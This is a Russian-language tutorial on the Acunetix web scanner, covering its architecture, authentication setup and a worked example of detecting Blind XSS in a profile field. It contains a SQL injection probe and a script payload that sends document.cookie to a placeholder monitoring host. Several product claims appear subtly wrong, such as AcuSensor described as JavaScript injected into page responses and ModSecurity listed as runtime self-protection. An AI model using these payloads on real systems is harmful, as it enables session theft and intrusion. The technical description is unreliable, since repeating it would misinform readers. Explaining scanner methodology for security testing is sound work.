# Acunetix: Архитектура, методология сканирования и интеграция в процесс тестирования на проникновение

## Контекст и базовые понятия

Web Application Security Scanner (WaaS) — это класс автоматизированных инструментов, предназначенных для обнаружения уязвимостей в веб-приложениях путем анализа их кода, структуры и поведения. В отличие от сканеров сетевой инфраструктуры (например, Nessus или OpenVAS), которые фокусируются на портах, службах и устаревших версиях ПО, WaaS работает на уровне прикладного протокола (HTTP/HTTPS), эмулируя действия легитимного пользователя и злоумышленника одновременно.

Acunetix (ранее известный как Acunetix Web Vulnerability Scanner, WVS) является одним из наиболее известных коммерческих представителей этого класса. Его ключевая особенность заключается в использовании технологии ** AcuSensor™** (инструментальный анализ) в сочетании с классическим **черноящичным сканированием** (через прокси). Это позволяет ему обнаруживать уязвимости, которые невозможно выявить стандартными методами инъекции, особенно в современных JavaScript-приложениях и приложениях с динамической генерацией контента.

Для понимания места Acunetix в экосистеме информационной безопасности необходимо разграничить несколько смежных понятий, которые часто путают на этапе планирования аудита.

| Понятие | Область применения | Методология | Отношение к коду | Примеры инструментов |
| :--- | :--- | :--- | :--- | :--- |
| **DAST (Dynamic Application Security Testing)** | Рабочее приложение (Runtime) | Эмуляция запросов, анализ ответов | Не анализирует исходный код | Acunetix, Burp Suite Professional, OWASP ZAP |
| **SAST (Static Application Security Testing)** | Исходный код / Бинарные файлы | Статический анализ, контроль потока данных | Анализирует исходный код | SonarQube, Checkmarx, Fortify |
| **IAST (Interactive Application Security Testing)** | Рабочее приложение + Агент | Анализ трафика + анализ состояния приложения | Анализирует код через агент | Contrast Security, HCL AppScan |
| **RASP (Runtime Application Self-Protection)** | Защита в реальном времени | Блокировка атак на лету | Интегрировано в приложение | ModSecurity, Imperva WAF |

Acunetix позиционируется как инструмент DAST, но его архитектура выходит за рамки классического DAST благодаря внедрению сенсоров. Это стирает грань между DAST и IAST, хотя технически AcuSensor работает не как агент, интегрированный в процесс приложения (как в классическом IAST), а как модифицированный ответ веб-сервера, внедряющий JavaScript-код на страницу.

**Ключевые определения:**
1.  **Crawler (Паук):** Компонент Acunetix, который обходит структуру веб-приложения, выявляя все доступные URL, формы, параметры и точки ввода. Он учитывает `robots.txt`, `sitemap.xml` и динамические ссылки, генерируемые JavaScript.
2.  **Scanner Engine (Движок сканирования):** Модуль, который генерирует вредоносные запросы (payloads) на основе обнаруженных точек ввода и анализирует ответы сервера на наличие признаков успешной эксплуатации.
3.  **AcuSensor:** Технология, при которой Acunetix внедряет небольшой скрипт в HTML-ответ сервера. Этот скрипт перехватывает данные, отправляемые на сервер, и отправляет их обратно в Acunetix для анализа, позволяя обнаруживать уязвимости в коде, который не генерирует явных ошибок или изменений в HTML-ответе.
4.  **AcuMonitor:** Внешний сервис (out-of-band), используемый для обнаружения уязвимостей, не оставляющих следа в ответе сервера (например, Blind XSS, SSRF, XXE). Сканер отправляет запрос с доменом AcuMonitor; если сервер делает исходящий запрос к этому домену, уязвимость подтверждается.

**Почему автоматизация необходима:**
Согласно отраслевой статистике (Gartner, OWASP), значительная часть кибератак направлена именно на веб-приложения. Ручной аудит неэффективен из-за объема кода и скорости появления новых векторов атак. Автоматизированные сканеры, такие как Acunetix, обеспечивают непрерывное тестирование (Continuous Testing) в рамках CI/CD, что критично для DevSecOps. Однако они не заменяют ручное тестирование на проникновение, а лишь выявляют «низко висящие фрукты» и рутинные уязвимости, освобождая время специалистов для анализа сложных логических ошибок.

## Внутреннее устройство предмета

Архитектура Acunetix 360 (современная версия продукта) представляет собой распределенную систему, состоящую из нескольких ключевых компонентов, работающих в синергии. Понимание внутренней структуры необходимо для правильной настройки сканирования и интерпретации результатов.

### Компоненты системы

1.  **Acunetix Server (Управляющий узел):**
    *   Центральный компонент, отвечающий за управление лицензиями, пользователями, расписанием сканирований и агрегацию результатов.
    *   Может быть развернут локально (On-Premises) или в облаке (Acunetix Online).
    *   Содержит базу данных уязвимостей (Vulnerability Database), которая обновляется ежедневно. База включает не только известные CVE, но и эвристические правила для обнаружения новых классов уязвимостей.

2.  **AcuSensor (Инструментальный сенсор):**
    *   Это не отдельный процесс, а технология внедрения. При включении AcuSensor сканер модифицирует HTTP-ответы веб-приложения, добавляя в `<head>` или `<body>` HTML-страницы JavaScript-код.
    *   Этот код перехватывает события `fetch`, `XMLHttpRequest`, `jQuery.ajax` и другие механизмы отправки данных.
    *   Когда приложение отправляет данные на сервер, скрипт копирует эти данные и отправляет их в Acunetix Server.
    *   **Преимущество:** Позволяет обнаруживать уязвимости в коде, который не возвращает явных ошибок (например, SQL-инъекции в API, возвращающие 200 OK, или логические ошибки).

3.  **AcuMonitor (Out-of-Band сервис):**
    *   Внешний DNS/HTTP-сервер, предоставляемый Acunetix.
    *   Используется для обнаружения уязвимостей, где результат эксплуатации не виден в ответе сервера (Blind vulnerabilities).
    *   Пример: Если уязвимое приложение делает DNS-запрос к `abc123.acunetix.net`, AcuMonitor фиксирует этот запрос и сообщает сканеру об успешной эксплуатации.

4.  **Multiple Scanning Engines (Распределенные движки):**
    *   Для ускорения сканирования крупных приложений Acunetix позволяет запускать несколько независимых движков сканирования на разных машинах.
    *   Движки работают параллельно, сканируя разные части приложения или разные цели одновременно.
    *   Результаты агрегируются на Acunetix Server.

5.  **Login Sequence Recorder (Записыватель последовательности входа):**
    *   Инструмент для эмуляции авторизации. Поскольку многие уязвимости доступны только авторизованным пользователям, сканер должен пройти аутентификацию.
    *   Позволяет записать шаги входа (отправка формы, обработка CSRF-токенов, заголовки авторизации) и сохранить их как сессию.
    *   Поддерживает сложные сценарии: CAPTCHA (с пометкой для ручной проверки), OAuth, двухфакторную аутентификацию (с временными кодами).

### Механизм обнаружения уязвимостей

Acunetix использует гибридный подход к детекции:

1.  **Черноящичное сканирование (Black-box):**
    *   Генерация payloads для каждой точки ввода (URL-параметры, POST-данные, заголовки, cookies).
    *   Анализ ответов сервера на наличие специфических строк, ошибок, изменений в DOM или времени отклика.
    *   Пример: Для SQL-инъекции сканер отправляет `' OR 1=1--` и проверяет, изменился ли ответ по сравнению с базовым запросом.

2.  **Инструментальный анализ (AcuSensor):**
    *   Внедрение кода в ответ.
    *   Перехват данных, отправляемых клиентом на сервер.
    *   Анализ этих данных на сервере с помощью встроенных правил.
    *   Позволяет обнаруживать уязвимости в коде, который не генерирует явных ошибок.

3.  **Out-of-Band (AcuMonitor):**
    *   Использование внешних сервисов для детекции blind-уязвимостей.
    *   Пример: Для SSRF сканер отправляет запрос к `http://<acu_monitor_domain>/test`. Если сервер делает исходящий запрос к этому домену, уязвимость подтверждается.

### Сравнительная таблица методов обнаружения

| Метод обнаружения | Принцип работы | Типичные уязвимости | Преимущества | Ограничения |
| :--- | :--- | :--- | :--- | :--- |
| **Black-box** | Анализ HTTP-ответов | SQLi, XSS, Directory Traversal | Не требует доступа к коду | Высокий уровень ложных срабатываний (False Positives) |
| **AcuSensor** | Внедрение JS в ответ | SQLi, XSS, SSRF, Logic Bugs | Низкий уровень ложных срабатываний, обнаружение в API | Требует модификации ответов сервера, может влиять на производительность |
| **AcuMonitor** | Внешние DNS/HTTP-запросы | Blind XSS, SSRF, XXE, Command Injection | Обнаружение blind-уязвимостей | Требует интернет-соединения, зависит от доступности AcuMonitor |

## Применение и работа с предметом

Работа с Acunetix в рамках тестирования на проникновение включает несколько этапов: подготовка цели, настройка сканирования, запуск, анализ результатов и генерация отчета. Каждый этап требует понимания технических нюансов инструмента.

### Настройка цели и аутентификации

Перед сканированием необходимо правильно настроить цель. Acunetix автоматически определяет технологии (OS, Web Server, Framework) и адаптирует сканирование под них. Однако для сложных приложений требуется ручная настройка аутентификации.

**Типовые операции:**
1.  **Добавление цели:** Ввод URL, выбор типа сканирования (Full, Quick, Custom).
2.  **Настройка аутентификации:** Использование Login Sequence Recorder для записи шагов входа.
3.  **Настройка параметров сканирования:** Глубина обхода, скорость, игнорирование определенных URL.

**Пример настройки аутентификации через Login Sequence Recorder:**

```json
{
  "login_sequence": {
    "steps": [
      {
        "type": "GET",
        "url": "https://target.com/login",
        "description": "Получение страницы входа"
      },
      {
        "type": "POST",
        "url": "https://target.com/auth",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded",
          "X-CSRF-Token": "{{csrf_token}}"
        },
        "body": "username=admin&password=secret&csrf={{csrf_token}}",
        "description": "Отправка учетных данных"
      },
      {
        "type": "VERIFY",
        "url": "https://target.com/dashboard",
        "condition": "contains('Welcome, admin')",
        "description": "Проверка успешного входа"
      }
    ]
  }
}
```

### Запуск сканирования и мониторинг

Acunetix поддерживает несколько типов сканирований:
*   **Full Scan:** Полный обход и сканирование всех найденных страниц.
*   **Quick Scan:** Быстрое сканирование только основных страниц.
*   **Custom Scan:** Настройка параметров под конкретные цели.

**Мониторинг в реальном времени:**
Acunetix предоставляет интерфейс для мониторинга процесса сканирования:
*   Количество просканированных страниц.
*   Количество обнаруженных уязвимостей.
*   Скорость сканирования.
*   Статус движков.

**Пример команды для запуска сканирования через API:**

```bash
curl -X POST "https://online.acunetix.com/api/v1/scans" \
  -H "Authorization: Bearer <API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "target": {
      "url": "https://target.com",
      "name": "Target App"
    },
    "scan_type": "full",
    "authentication": {
      "sequence_id": "12345"
    },
    "sensors": {
      "acunetix_sensor": true,
      "acunetix_monitor": true
    }
  }'
```

### Анализ результатов и устранение ложных срабатываний

Результаты сканирования представлены в виде списка уязвимостей с детальной информацией:
*   **Название уязвимости:** Например, "SQL Injection in parameter 'id'".
*   **Уровень риска:** Critical, High, Medium, Low, Informational.
*   **Proof of Concept (PoC):** Запрос, ответ, и объяснение, почему уязвимость считается реальной.
*   **Рекомендации:** Как исправить уязвимость.

**Типичные ошибки при анализе:**
1.  **Игнорирование ложных срабатываний:** Не все найденные уязвимости реальны. Необходимо проверять PoC.
2.  **Неправильная настройка аутентификации:** Если аутентификация настроена неверно, сканер не сможет обнаружить уязвимости в защищенных разделах.
3.  **Игнорирование JavaScript:** Если не включен анализ JavaScript, сканер может пропустить уязвимости в SPA-приложениях.

**Пример фрагмента отчета об уязвимости (JSON):**

```json
{
  "vulnerability_id": "vuln_12345",
  "name": "SQL Injection",
  "severity": "Critical",
  "location": {
    "url": "https://target.com/api/users",
    "parameter": "id",
    "method": "GET"
  },
  "proof": {
    "request": "GET /api/users?id=1' OR 1=1-- HTTP/1.1\r\nHost: target.com",
    "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"users\": [{\"id\": 1, \"name\": \"Admin\"}, {\"id\": 2, \"name\": \"User\"}]}"
  },
  "recommendation": "Use parameterized queries or prepared statements."
}
```

## Сквозной практический пример: Сканирование веб-приложения с аутентификацией и обнаружение Blind XSS

**Исходные условия:**
*   **Цель:** Веб-приложение `https://testapp.local` с формой входа и профилем пользователя.
*   **Инструмент:** Acunetix 360 On-Premises.
*   **Роль:** Пентестер.
*   **Сценарий:** Обнаружение уязвимости Blind XSS в поле "Bio" профиля пользователя, доступного только после авторизации.

### Шаг 1: Настройка цели и аутентификации

Сканеру необходимо пройти аутентификацию, чтобы получить доступ к профилю пользователя. Используем Login Sequence Recorder для записи шагов входа.

**Действие:** Запись последовательности входа в Login Sequence Recorder.

```json
{
  "login_sequence": {
    "steps": [
      {
        "type": "GET",
        "url": "https://testapp.local/login",
        "description": "Получение страницы входа"
      },
      {
        "type": "POST",
        "url": "https://testapp.local/auth",
        "headers": {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": "username=pentester&password=secret123",
        "description": "Отправка учетных данных"
      },
      {
        "type": "VERIFY",
        "url": "https://testapp.local/dashboard",
        "condition": "contains('Dashboard')",
        "description": "Проверка успешного входа"
      }
    ]
  }
}
```

**Ожидаемый вывод:** Последовательность сохранена в Acunetix с ID `seq_001`. Сканер сможет использовать эту сессию для доступа к защищенным разделам.

### Шаг 2: Настройка сканирования с включением AcuSensor и AcuMonitor

Для обнаружения Blind XSS необходимо включить AcuMonitor. Также включаем AcuSensor для анализа JavaScript.

**Действие:** Настройка параметров сканирования.

```json
{
  "scan_config": {
    "target_url": "https://testapp.local",
    "authentication_sequence_id": "seq_001",
    "sensors": {
      "acunetix_sensor": true,
      "acunetix_monitor": true
    },
    "scan_type": "full",
    "javascript_analysis": true
  }
}
```

**Ожидаемый вывод:** Сканер начинает обход приложения. AcuSensor внедряется в ответы сервера, AcuMonitor готов к приходу DNS/HTTP-запросов.

### Шаг 3: Обнаружение уязвимости

Сканер находит поле "Bio" в профиле пользователя. Он отправляет payload с доменом AcuMonitor.

**Действие:** Сканер генерирует запрос для проверки на Blind XSS.

```http
POST /api/profile/update HTTP/1.1
Host: testapp.local
Cookie: session_id=abc123
Content-Type: application/json

{
  "bio": "<script>new Image().src='https://<acu_monitor_domain>/xss?cookie='+document.cookie</script>"
}
```

**Ожидаемый вывод:** AcuMonitor регистрирует DNS-запрос или HTTP-запрос от сервера `testapp.local` к `<acu_monitor_domain>`. Acunetix фиксирует это событие и создает алерт.

### Шаг 4: Анализ результатов и подтверждение

Пентестер получает алерт в Acunetix.

**Действие:** Просмотр деталей алерта.

```json
{
  "alert": {
    "id": "alert_98765",
    "name": "Blind XSS",
    "severity": "High",
    "location": {
      "url": "https://testapp.local/api/profile/update",
      "parameter": "bio"
    },
    "proof": {
      "type": "out_of_band",
      "monitor_event": {
        "domain": "<acu_monitor_domain>",
        "timestamp": "2023-10-01T12:00:00Z",
        "source_ip": "192.168.1.100"
      }
    },
    "recommendation": "Sanitize user input on the server side. Use a Content Security Policy (CSP)."
  }
}
```

**Ожидаемый вывод:** Уязвимость подтверждена. Пентестер может сообщить разработчикам о необходимости санитизации ввода.

### Ожидаемый вывод примера

Пример демонстрирует, как Acunetix с использованием AcuSensor и AcuMonitor может обнаружить сложные уязвимости, такие как Blind XSS, которые не видны при стандартном черноящичном сканировании. Это подчеркивает важность правильной настройки сканирования и использования всех доступных технологий инструмента.

## Аналитический вывод

Acunetix представляет собой мощный инструмент для автоматизированного тестирования безопасности веб-приложений, сочетающий классические методы DAST с инновационными технологиями AcuSensor и AcuMonitor. Его ключевое преимущество заключается в способности обнаруживать уязвимости в современных JavaScript-приложениях и API, где традиционные сканеры часто бессильны. Однако, как и любой автоматизированный инструмент, Acunetix не заменяет ручное тестирование на проникновение, а лишь дополняет его, выявляя рутинные уязвимости и снижая нагрузку на специалистов.

Для эффективного использования Acunetix в процессе тестирования на проникновение необходимо:
1.  Правильно настраивать аутентификацию и обход сложных сценариев.
2.  Включать AcuSensor и AcuMonitor для обнаружения сложных уязвимостей.
3.  Анализировать результаты сканирования, отсеивая ложные срабатывания.
4.  Интегрировать сканирование в CI/CD для непрерывного мониторинга безопасности.

В контексте современного тестирования на проникновение Acunetix является важным компонентом экосистемы безопасности, позволяющим ускорить процесс обнаружения уязвимостей и повысить общий уровень защиты веб-приложений.
